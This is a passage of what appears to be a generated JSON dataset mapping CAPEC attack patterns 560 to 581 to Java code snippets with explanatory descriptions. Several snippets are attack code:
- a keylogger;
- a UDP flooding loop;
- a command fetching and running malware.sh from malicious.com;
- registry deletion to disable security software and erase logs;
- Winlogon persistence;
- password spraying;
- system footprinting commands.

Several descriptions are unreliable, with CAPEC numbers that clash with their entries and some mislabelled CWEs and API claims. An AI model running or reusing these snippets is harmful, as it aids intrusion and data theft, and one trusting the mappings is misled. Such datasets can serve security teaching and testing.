        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class SatelliteJamming {\n    private static final int PORT = 9876;\n    private static final String TARGET_IP = \"192.168.1.100\";\n\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(TARGET_IP);\n\n            // Simulate jamming by sending disruptive signals\n            for (int i = 0; i < 1000; i++) {\n                String disruptiveMessage = \"JAMMING_SIGNAL\" + i;\n                buffer = disruptiveMessage.getBytes();\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, PORT);\n                socket.send(packet);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates an orbital jamming attack by sending disruptive signals to a target satellite. The code uses a DatagramSocket to send multiple UDP packets containing disruptive messages to the target IP address and port. This represents the main idea of the CAPEC 'Orbital Jamming' by disrupting the intended transmission to the satellite. The code also embodies related CWEs such as CWE-924 (Improper Enforcement of Message Integrity During Transmission) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not ensuring the integrity and proper endpoint verification of the communication."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class VulnerableAuthSystem {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Adding a user with known credentials\n        userDatabase.put(\"admin\", \"password123\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Check if the user exists and the password matches\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            if (failedAttempts >= MAX_ATTEMPTS) {\n                System.out.println(\"Too many failed attempts. Account locked.\");\n                // In a real system, you would lock the account or take other actions\n            }\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. The system uses a hardcoded username and password ('admin', 'password123'), which is an example of CWE-522 (Insufficiently Protected Credentials). The authentication mechanism is single-factor (CWE-308) and relies on a password system for primary authentication (CWE-309). The code also demonstrates improper restriction of excessive authentication attempts (CWE-307) by allowing up to 5 failed attempts before locking the account. This snippet highlights the risks associated with using known credentials and insufficient security measures in authentication systems."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter admin username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter admin password: \");\n        String password = scanner.nextLine();\n        System.out.print(\"Enter target machine IP: \");\n        String targetIP = scanner.nextLine();\n\n        try {\n            if (authenticate(username, password)) {\n                accessAdminShare(targetIP);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate weak password authentication\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n\n    private static void accessAdminShare(String targetIP) throws UnknownHostException, IOException {\n        InetAddress inet = InetAddress.getByName(targetIP);\n        if (inet.isReachable(5000)) {\n            System.out.println(\"Accessing admin share on \" + targetIP);\n            // Simulate access to admin share\n        } else {\n            System.out.println(\"Target machine is not reachable.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary uses stolen or guessed Windows administrator credentials to access Windows Admin Shares on a target machine. The code includes a simple authentication mechanism that checks for a hardcoded username and password, representing CWE-521 (Weak Password Requirements) and CWE-309 (Use of Password System for Primary Authentication). The code also lacks multi-factor authentication (CWE-308) and does not implement any password aging mechanism (CWE-262, CWE-263). The main idea is to show how easily an attacker can gain access to sensitive resources if weak authentication practices are in place."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SharedFileModifier {\n    public static void main(String[] args) {\n        String sharedFilePath = \"/shared/directory/sharedFile.txt\";\n        String maliciousContent = \"<script>alert('Hacked!');</script>\";\n\n        try {\n            // CWE-284: Improper Access Control\n            if (Files.isWritable(Paths.get(sharedFilePath))) {\n                // CWE-378: Creation of Temporary File With Insecure Permissions\n                File tempFile = File.createTempFile(\"tempFile\", \".txt\");\n                try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempFile))) {\n                    writer.write(maliciousContent);\n                }\n\n                // CWE-434: Unrestricted Upload of File with Dangerous Type\n                Files.copy(tempFile.toPath(), Paths.get(sharedFilePath), StandardCopyOption.REPLACE_EXISTING);\n\n                // CWE-494: Download of Code Without Integrity Check\n                // Simulating download and execution of code without integrity check\n                Runtime.getRuntime().exec(\"curl -O http://malicious.com/malware.sh && sh malware.sh\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary modifies a shared file by injecting malicious content. The code checks if the shared file is writable (CWE-284: Improper Access Control) and then creates a temporary file with insecure permissions (CWE-378: Creation of Temporary File With Insecure Permissions). The malicious content is written to this temporary file, which is then copied to the shared file location (CWE-434: Unrestricted Upload of File with Dangerous Type). Additionally, the code simulates downloading and executing a script from a remote location without verifying its integrity (CWE-494: Download of Code Without Integrity Check). This snippet embodies the main idea of CAPEC-27: Modify Shared File, by demonstrating how an attacker can manipulate shared files to execute malicious content when accessed by users."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String uploadPath = getServletContext().getRealPath(\"\") + File.separator + \"uploads\";\n        File uploadDir = new File(uploadPath);\n        if (!uploadDir.exists()) uploadDir.mkdir();\n        File file = new File(uploadPath + File.separator + fileName);\n        try (InputStream fileContent = filePart.getInputStream(); FileOutputStream fos = new FileOutputStream(file)) {\n            int read;\n            final byte[] bytes = new byte[1024];\n            while ((read = fileContent.read(bytes)) != -1) {\n                fos.write(bytes, 0, read);\n            }\n        }\n        response.getWriter().println(\"File uploaded successfully!\");\n    }\n\n    private String getFileName(Part part) {\n        String contentDisp = part.getHeader(\"content-disposition\");\n        for (String token : contentDisp.split(\";\")) {\n            if (token.trim().startsWith(\"filename\")) {\n                return token.substring(token.indexOf('=') + 2, token.length() - 1);\n            }\n        }\n        return \"\";\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality. The servlet handles file uploads via HTTP POST requests and saves the uploaded files to a directory under the web root. The code does not perform any validation on the file type or content, nor does it implement proper access control mechanisms. This can allow an attacker to upload malicious files, which can then be executed by browsing to the file's URL. The code embodies the main idea of CAPEC-172 (Add Malicious File to Shared Webroot) and is related to several CWEs: CWE-284 (Improper Access Control), CWE-219 (Storage of File with Sensitive Data Under Web Root), CWE-433 (Unparsed Raw Web Content Delivery), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\n\npublic class LogonScriptModifier {\n    private static final String LOGON_SCRIPT_PATH = \"C:\\\\Users\\\\Public\\\\logon.bat\";\n    private static final String MALICIOUS_CODE = \"echo Malicious code executed >> C:\\\\Users\\\\Public\\\\log.txt\";\n    private static final String HARD_CODED_PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        if (authenticateUser(\"admin\", HARD_CODED_PASSWORD)) {\n            try {\n                FileWriter writer = new FileWriter(LOGON_SCRIPT_PATH, true);\n                writer.write(MALICIOUS_CODE);\n                writer.close();\n                System.out.println(\"Logon script modified successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticateUser(String username, String password) {\n        // Simulate client-side authentication\n        return \"admin\".equals(username) && HARD_CODED_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify a logon script to include malicious code. The code uses hard-coded credentials (CWE-798, CWE-259) for authentication, which is performed on the client side (CWE-603). If the authentication is successful, the code appends a malicious command to a logon script file, which will be executed every time a user logs on (CAPEC-284). This represents improper access control (CWE-284) as the logon script is not adequately protected from unauthorized modifications."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PasswordSprayingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public static void main(String[] args) {\n        // Sample user database with weak passwords\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"password123\");\n        userDatabase.put(\"user3\", \"password123\");\n\n        // Password spraying attack simulation\n        String[] commonPasswords = {\"password123\", \"123456\", \"qwerty\"};\n        for (String password : commonPasswords) {\n            for (String user : userDatabase.keySet()) {\n                if (authenticate(user, password)) {\n                    System.out.println(\"User \" + user + \" authenticated successfully with password: \" + password);\n                } else {\n                    System.out.println(\"Failed to authenticate user \" + user + \" with password: \" + password);\n                }\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n        if (userDatabase.containsKey(username) && userDatabase.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Password Spraying attack. The code initializes a user database with weak passwords and simulates an attack by trying a small list of common passwords against each user account. The `authenticate` method checks if the provided password matches the stored password for a given user. If the number of failed attempts exceeds a maximum threshold, the account is locked. This example highlights several weaknesses: weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class PasswordHasher {\n    public static void main(String[] args) {\n        String password = \"password123\";\n        String salt = \"1234\"; // Predictable salt\n        String hashedPassword = hashPassword(password, salt);\n        System.out.println(\"Hashed Password: \" + hashedPassword);\n    }\n\n    public static String hashPassword(String password, String salt) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n            md.update(salt.getBytes());\n            byte[] hashedBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashedBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of password hashing. The `hashPassword` method uses SHA-256 to hash a password combined with a predictable salt. This approach is vulnerable because the salt is not unique or random, making it easier for attackers to use precomputed hash tables (rainbow tables) to crack the hashed passwords. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how improper handling of password hashing can lead to security vulnerabilities. Specifically, it highlights CWE-759 (Use of a One-Way Hash without a Salt) and CWE-760 (Use of a One-Way Hash with a Predictable Salt)."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        Properties config = new Properties();\n        try {\n            // Using an obsolete method to load configuration\n            FileInputStream fis = new FileInputStream(new File(\"config.properties\"));\n            config.load(fis);\n            fis.close();\n\n            // Using a deprecated method to get a property\n            String sensitiveData = config.getProperty(\"sensitiveData\");\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration loader that embodies the deprecated CAPEC 'Obtain Data via Utilities' and related CWEs. The code uses an obsolete method to load configuration data from a properties file and a deprecated method to retrieve a property. This suggests that the code has not been actively reviewed or maintained, making it susceptible to security issues such as failure to protect stored data from modification (CWE-217), failure to provide confidentiality for stored data (CWE-218), and reliance on deprecated functions (CWE-477). The code's main idea is to highlight the risks associated with using outdated and deprecated methods in handling sensitive configuration data."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.awt.event.KeyEvent;\nimport java.awt.event.KeyListener;\nimport javax.swing.JFrame;\n\npublic class Keylogger extends JFrame implements KeyListener {\n    private static final String LOG_FILE = \"keystrokes.log\";\n\n    public Keylogger() {\n        this.addKeyListener(this);\n        this.setSize(300, 200);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        this.setVisible(true);\n    }\n\n    @Override\n    public void keyTyped(KeyEvent e) {\n        logKeystroke(e.getKeyChar());\n    }\n\n    @Override\n    public void keyPressed(KeyEvent e) {}\n\n    @Override\n    public void keyReleased(KeyEvent e) {}\n\n    private void logKeystroke(char keyChar) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(keyChar);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        new Keylogger();\n    }\n}",
        "description": "This Java code snippet demonstrates a simple keylogger application. The keylogger captures all keystrokes made by the user and logs them to a file named 'keystrokes.log'. The Keylogger class extends JFrame and implements KeyListener to capture key events. The keyTyped method logs each keystroke by appending it to the log file. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary could capture user input, including credentials, through a keylogger. The related CWEs provide context on potential weaknesses in authentication mechanisms that could be exploited in conjunction with keylogging, such as weak password requirements (CWE-521) and insufficiently protected credentials (CWE-522)."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import java.io.*;\nimport java.util.logging.*;\n\npublic class Keylogger {\n    private static final Logger logger = Logger.getLogger(Keylogger.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            String input;\n            while ((input = reader.readLine()) != null) {\n                logSensitiveData(input);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void logSensitiveData(String data) {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-214: Invocation of Process Using Visible Sensitive Information\n        logger.info(\"User input: \" + data);\n    }\n}",
        "description": "This Java code snippet represents a simple keylogger that captures user input from the console and logs it. The main idea of the CAPEC is embodied by capturing and logging the data that a user legitimately enters into the system. The code leverages the `BufferedReader` to read user input and the `Logger` to log this input, which can be sensitive information. This demonstrates CWE-200 by exposing sensitive information to an unauthorized actor through logging, and CWE-214 by potentially invoking processes with visible sensitive information. The code is a concise example of how an attacker might collect data provided by users without their knowledge."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            URL url = new URL(\"http://example.com\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            // Unchecked error condition (CWE-391)\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of an obsolete function (CWE-477) and unchecked error conditions (CWE-391). The code uses the deprecated `URLConnection` class to open a connection to a URL and read its content. Additionally, the catch block simply prints the stack trace without properly handling the exception, which can lead to security vulnerabilities. This embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' by showcasing outdated and insecure coding practices."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LoggingExample {\n    private static final Logger logger = Logger.getLogger(LoggingExample.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup local file logging\n            FileHandler fh = new FileHandler(\"local_log.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            logger.info(\"User password: secret123\"); // CWE-532\n\n            // Simulate blocking central logging\n            blockCentralLogging(); // CAPEC-117\n\n            // Log insufficient information\n            logger.info(\"User login attempt\"); // CWE-778\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void blockCentralLogging() {\n        try {\n            // Simulate blocking by writing to a local file instead of sending to a central repository\n            FileWriter fw = new FileWriter(\"central_log_blocked.log\");\n            fw.write(\"Central logging blocked\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where logging to a central repository is blocked, embodying the main idea of CAPEC-117. The code sets up local file logging and logs sensitive information (CWE-532), which could be exploited by an attacker. It also logs insufficient information about a security-critical event (CWE-778). The `blockCentralLogging` method simulates the blocking of central logging by writing a message to a local file instead of sending logs to a central repository. This represents an adversary's attempt to hide indicators of compromise by preventing logs from being delivered to a central location."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FileInflation {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        try {\n            inflateFile(filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void inflateFile(String filePath) throws IOException {\n        File file = new File(filePath);\n        if (!file.exists()) {\n            file.createNewFile();\n        }\n        try (FileOutputStream fos = new FileOutputStream(file, true)) {\n            byte[] data = new byte[1024 * 1024]; // 1 MB of data\n            for (int i = 0; i < 100; i++) { // Inflate file by 100 MB\n                fos.write(data);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of artificially inflating file sizes, which can lead to a Denial of Service (DoS) condition on devices with limited storage capacity. The `inflateFile` method appends 100 MB of data to a specified file, potentially exhausting storage resources. This example embodies the CAPEC idea of modifying file contents to inflate their size. It also touches on CWE-774 (Allocation of File Descriptors or Handles Without Limits or Throttling) by not imposing any restrictions on file operations, and CWE-409 (Improper Handling of Highly Compressed Data) by potentially handling large amounts of data inefficiently."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ProcessFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all running processes\n            Process process = Runtime.getRuntime().exec(\"ps -aux\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of process footprinting. The code executes a system command (`ps -aux`) to list all running processes on the target system and prints the output to the console. This can expose sensitive information about the system's processes to unauthorized users (CWE-200). The code does not implement any access control mechanisms to restrict who can execute this command or view its output, leading to potential exposure of sensitive system information (CWE-497). Additionally, the command-line arguments and environment variables used in the process invocation can be visible to other processes on the system (CWE-214)."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ServiceFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Command to list all services running on the system\n            String command = \"tasklist /svc\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of 'Services Footprinting' by executing a system command to list all services running on the target system. The command 'tasklist /svc' is used to gather information about the services, and the output is printed to the console. This can expose sensitive information (CWE-200) to unauthorized users if the console output is not properly secured. The code also highlights the risk of exposing sensitive system-level information (CWE-497) and the invocation of a process using visible sensitive information (CWE-214). The main idea is to show how an adversary can exploit such functionality to gather information about the target environment for further malicious activities."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AccountFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list all users on the system\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposing sensitive information\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of 'Account Footprinting' by executing a system command to list all user accounts on a Windows system using 'net user'. The output of this command is read and printed to the console. This represents CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes potentially sensitive information about user accounts to anyone who can run this code. The code also touches on CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command and its output can be visible to other processes on the system. This snippet highlights the risk of exposing system-level information to unauthorized users, which can be exploited for further malicious activities."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class GroupPermissionFootprinting {\n    public static void main(String[] args) {\n        try {\n            // Execute the command to list local groups\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to 'Group Permission Footprinting' (CAPEC). The code executes a system command ('net localgroup') to list all local groups on a Windows system. The output of this command, which includes sensitive information about user groups and their permissions, is then printed to the console. This can expose sensitive information to unauthorized actors (CWE-200). The code also indirectly highlights the risk of invoking processes with visible sensitive information (CWE-214) and the potential for exposing access control list files (CWE-529). The main idea is to show how an adversary could exploit functionality meant for authorized users to gather information that could be used for further malicious activities."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class OwnerFootprinting {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java OwnerFootprinting <user_home_directory>\");\n            return;\n        }\n\n        File userHomeDir = new File(args[0]);\n        File ntuserDat = new File(userHomeDir, \"ntuser.dat\");\n\n        if (ntuserDat.exists()) {\n            try {\n                BasicFileAttributes attrs = Files.readAttributes(ntuserDat.toPath(), BasicFileAttributes.class);\n                System.out.println(\"Last modified time of ntuser.dat: \" + attrs.lastModifiedTime());\n            } catch (IOException e) {\n                System.out.println(\"Error reading file attributes: \" + e.getMessage());\n            }\n        } else {\n            System.out.println(\"ntuser.dat file does not exist in the specified directory.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Owner Footprinting' by accessing and displaying the last modified time of the 'ntuser.dat' file in a specified user's home directory. The code takes the user's home directory as an argument, checks for the existence of the 'ntuser.dat' file, and if found, retrieves and prints its last modified time. This information can be used by an adversary to determine the last login time of the user, which can inform further targeted malicious behavior. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and the use of visible sensitive information in command-line arguments (CWE-214)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DisableSecuritySoftware {\n    private static final String HARD_CODED_PASSWORD = \"admin123\";\n\n    public static void main(String[] args) {\n        if (authenticate(HARD_CODED_PASSWORD)) {\n            try {\n                // Disable security software by deleting a critical registry key\n                Runtime.getRuntime().exec(\"reg delete HKLM\\\\Software\\\\SecuritySoftware /f\");\n                // Delete log files to cover tracks\n                Files.deleteIfExists(Paths.get(\"C:\\\\SecuritySoftware\\\\logs\\\\logfile.log\"));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // Improper access control: using hard-coded credentials for authentication\n        return HARD_CODED_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary disables security software by exploiting improper access control and using hard-coded credentials. The `authenticate` method uses a hard-coded password to grant access. If authentication is successful, the code attempts to disable security software by deleting a critical registry key and removing log files to avoid detection. This embodies the CAPEC 'Disable Security Software' by showing how an attacker can exploit weaknesses to disable security mechanisms."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.prefs.Preferences;\n\npublic class WinlogonHelperDLL {\n    public static void main(String[] args) {\n        // CWE-15: External Control of System or Configuration Setting\n        Preferences systemPrefs = Preferences.systemRoot();\n        try {\n            // CWE-798: Use of Hard-coded Credentials\n            String maliciousDLLPath = \"C:\\\\malicious\\\\malicious.dll\";\n            // CWE-427: Uncontrolled Search Path Element\n            systemPrefs.put(\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit\", maliciousDLLPath);\n            System.out.println(\"Malicious DLL path set in registry.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability (CAPEC) by modifying a Windows registry key to load a malicious DLL at startup. The code uses the Preferences API to access and modify system settings (CWE-15: External Control of System or Configuration Setting). It sets a hard-coded path to a malicious DLL (CWE-798: Use of Hard-coded Credentials) in the Winlogon registry key, which is part of the system's search path for startup programs (CWE-427: Uncontrolled Search Path Element). This allows the adversarial code to be executed when the system starts, representing a significant security risk."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SystemFootprinting {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/systeminfo\";\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                System.out.println(\"System Information: \" + response.toString());\n            } else {\n                System.out.println(\"Failed to retrieve system information. Response Code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of system footprinting by making an HTTP GET request to a target URL to retrieve system information. The code checks the response code to determine if the request was successful and then reads and prints the system information. This embodies the main idea of CAPEC-170 (System Footprinting) by actively probing a remote system to gather security-relevant information. The code also highlights CWE-204 (Observable Response Discrepancy) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive system information based on the response received from the target URL."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SecurityFootprint {\n    public static void main(String[] args) {\n        try {\n            // Execute a command to list installed security software\n            String command = \"wmic product get name,version\";\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Security Software Footprinting' by attempting to list all installed software on a Windows system using the 'wmic' command. The code executes a system command to retrieve the names and versions of installed products, which may include security tools. This information can be sensitive and should not be exposed to unauthorized users. The code embodies CWE-497 by potentially exposing sensitive system information. It also hints at CWE-1395 by relying on the 'wmic' command, which could be considered a third-party component with its own vulnerabilities. The code does not directly include malicious behavior (CWE-506, CWE-507) or spyware (CWE-512), but it could be part of a larger malicious application."
    },
    {
